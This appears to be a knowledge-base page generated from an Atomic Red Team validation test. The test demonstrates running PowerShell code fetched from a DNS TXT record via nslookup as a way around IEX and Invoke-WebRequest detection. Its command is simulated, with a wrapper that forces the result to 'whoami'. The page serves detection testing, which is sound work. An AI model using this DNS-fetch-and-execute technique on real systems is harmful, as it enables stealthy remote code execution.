---
atomic_guid: "999bff6d-dc15-44c9-9f5c-e1051bfc86e1"
title: "Abuse Nslookup with DNS Records"
framework: "atomic"
generated: "true"
attack_technique_id: "T1059.001"
attack_technique_name: "Command and Scripting Interpreter: PowerShell"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "999bff6d-dc15-44c9-9f5c-e1051bfc86e1"
  - "Abuse Nslookup with DNS Records"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Abuse Nslookup with DNS Records

Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.
[reference](https://twitter.com/jstrosch/status/1237382986557001729)

## Metadata

- Atomic GUID: 999bff6d-dc15-44c9-9f5c-e1051bfc86e1
- Technique: T1059.001: Command and Scripting Interpreter: PowerShell
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1059.001/T1059.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1059-command_and_scripting_interpreter|T1059.001]]

## Executor

- name: powershell

### Command

```powershell
# creating a custom nslookup function that will indeed call nslookup but forces the result to be "whoami"
# this would not be part of a real attack but helpful for this simulation
function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.yaml)
